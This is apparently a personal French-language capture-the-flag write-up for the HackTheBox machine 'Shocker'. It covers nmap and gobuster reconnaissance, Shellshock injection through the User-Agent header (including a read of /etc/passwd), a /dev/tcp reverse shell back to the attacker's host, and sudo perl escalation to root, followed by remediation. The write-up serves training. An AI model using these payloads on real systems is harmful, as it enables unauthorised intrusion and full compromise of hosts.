# Shocker — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Linux (Ubuntu) |
| **Difficulté** | 🟢 Easy |
| **Date** | 2026-__-__ |
| **Vecteur** | CGI Shellshock (`/cgi-bin/user.sh`) → shell `shelly` → `sudo perl` (GTFOBins) → root |
| **CVE** | CVE-2014-6271 (famille « Shellshock ») |
| **Tags** | web · cgi · shellshock · sudo · gtfobins |

> Remplacer `<IP_CIBLE>` par l'IP de ta session (change à chaque reset).
> Mon IP VPN (`tun0`) = `10.10.14.x` · Cible HTB = `10.10.10.x` / `10.129.x.x`.

> 🎯 **Objectif d'apprentissage de cette box** : ta **1re vraie privesc en deux temps**.
> Tu entres comme utilisateur **non privilégié**, puis tu escalades. Résiste au réflexe
> « un exploit = root » des machines précédentes : ici, *foothold* ≠ *root*.

---

## TL;DR

Deux ports : **80** (Apache) et **2222** (SSH). Le web ne montre qu'une image → brute force de contenu →
répertoire **`/cgi-bin/`** contenant un script **`user.sh`**. Ce CGI est vulnérable à **Shellshock
(CVE-2014-6271)** : une charge placée dans l'en-tête **`User-Agent`** est interprétée par Bash → exécution
de commande → reverse shell en **`shelly`** (user). `sudo -l` montre `(root) NOPASSWD: /usr/bin/perl` →
abus GTFOBins → **shell root**.

**Recon (80 + 2222) → `/cgi-bin/user.sh` → Shellshock (User-Agent) → shell `shelly` → `sudo perl` → root.**

---

## 1. Reconnaissance

```bash
# Scan complet (le réflexe)
nmap -sC -sV -p- -oA nmap/shocker <IP_CIBLE>
```

Ports notables :

| Port | Service | Version | Piste |
| --- | --- | --- | --- |
| 80 | HTTP | Apache httpd 2.4.18 | surface d'attaque web |
| 2222 | SSH | OpenSSH | accès distant *après* avoir des creds |

> Deux ports seulement, dont un service web et un SSH sur un port **inhabituel** (2222).
> Méthode : le **web** est la surface d'attaque ; le SSH servira *après* avoir trouvé des identifiants.

---

## 2. Énumération web

La page par défaut ne dit rien (juste une image) → il faut **découvrir le contenu caché**.

```bash
# Brute force de répertoires
gobuster dir -u http://<IP_CIBLE>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
# -> /cgi-bin/ (403 mais il existe)

# Chercher les SCRIPTS dans /cgi-bin/ (extensions de scripts serveur)
gobuster dir -u http://<IP_CIBLE>/cgi-bin/ -w <wordlist> -x sh,cgi,pl
# -> /cgi-bin/user.sh
```

> Indice de méthode : un répertoire **`/cgi-bin/`** = scripts exécutés côté serveur. Trouve le script
> qu'il contient (`user.sh`) — c'est lui la porte d'entrée.

Trouvé : **`/cgi-bin/user.sh`** (script shell exécuté par le serveur)

---

## 3. Accès initial (foothold)

**Faille : Shellshock (CVE-2014-6271).** À comprendre AVANT d'exploiter :

- Bash < 4.3 interprète du code placé **après une définition de fonction** dans une variable d'environnement.
- Un script CGI **passe les en-têtes HTTP dans l'environnement** du shell qui l'exécute.
- Donc : injecter la charge dans un en-tête (typiquement `User-Agent` ou `Referer`) → le serveur exécute
  ta commande. C'est une **injection de commande via l'environnement**.

```bash
# 1) Vérifier la vuln : faire exécuter une commande (id) via l'en-tête User-Agent
curl -H 'User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd' \
     http://<IP_CIBLE>/cgi-bin/user.sh
#   (le `echo; echo;` force une ligne vide pour que la sortie CGI soit valide — sinon 500)

# 2) Se mettre à l'écoute
nc -lvnp 4444

# 3) Reverse shell via l'en-tête injecté
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.x/4444 0>&1' \
     http://<IP_CIBLE>/cgi-bin/user.sh
```

- **Utilisateur obtenu :** `shelly` ⚠️ (PAS root — compte du service web)
- **Stabilisation du shell :**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # puis Ctrl+Z, stty raw -echo; fg, export TERM=xterm
```

**Flag user :** `/home/shelly/user.txt` (non publié).

> Piège rencontré : un **500 Internal Server Error** n'est pas forcément un échec — le CGI peut avoir
> exécuté ta commande mais renvoyé une sortie HTTP invalide. Ajoute `echo; echo;` avant ta commande.
> `nmap --script http-shellshock` sait détecter la faille, mais **construis la requête à la main** au
> moins une fois pour comprendre l'injection.

---

## 4. Énumération post-accès

Dérouler la checklist `linux-privesc` AVANT d'escalader. Premier réflexe :

```bash
sudo -l          # que puis-je lancer en root SANS mot de passe ?
id ; whoami
# si rien : find / -perm -4000 2>/dev/null ; getcap -r / 2>/dev/null ; crontab -l
```

Résultat de `sudo -l` :
```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

---

## 5. Élévation de privilèges

**Piste : abus d'un binaire autorisé en `sudo` (GTFOBins).**

- `sudo -l` révèle **`/usr/bin/perl`** lançable en root sans mot de passe.
- [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) → `perl` → section **`sudo`**.
- `perl` est un interpréteur : appelé en root, il lance un **shell root**.

```bash
sudo /usr/bin/perl -e 'exec "/bin/bash";'
id   # uid=0(root)
```

**Flag root :** `/root/root.txt` (non publié).

> Pourquoi ça marche (à savoir dire à l'oral) : `sudo` exécute le binaire **en root** ; si ce binaire peut
> lancer une commande arbitraire (interpréteur, éditeur, pager…), l'utilisateur hérite d'un shell root.
> C'est une **mauvaise configuration de sudoers**, pas une CVE.

---

## 6. Remédiation

- **Corriger Shellshock** : mettre Bash à jour (patchs 2014). Ne plus exposer de CGI Bash.
- **Durcir sudoers** : retirer le `NOPASSWD` sur un interpréteur ; moindre privilège (pas de binaire « shell-capable » en sudo).
- Retirer les scripts CGI inutiles ; WAF / filtrage des en-têtes suspects.

---

## 7. Leçons

- 1re box où **foothold ≠ root** : bien séparer les deux étapes dans mes notes.
- Shellshock = injection de commande **via l'environnement** (en-têtes CGI), pas via un champ de formulaire.
- Réflexe privesc n°1 : **`sudo -l`**, puis **GTFOBins** pour tout binaire autorisé.
- Un **500** sur un CGI peut cacher une exécution réussie → `echo; echo;`.

---

## Références

- CVE-2014-6271 (Shellshock) — <https://nvd.nist.gov/vuln/detail/CVE-2014-6271>
- GTFOBins (perl) — <https://gtfobins.github.io/gtfobins/perl/>
- Fiches liées : [gobuster](../outils/gobuster.md) · [burp](../outils/burp.md) · [reverse-shells](../outils/reverse-shells.md) · [linux-privesc](../outils/linux-privesc.md) · [gtfobins](../outils/gtfobins.md)
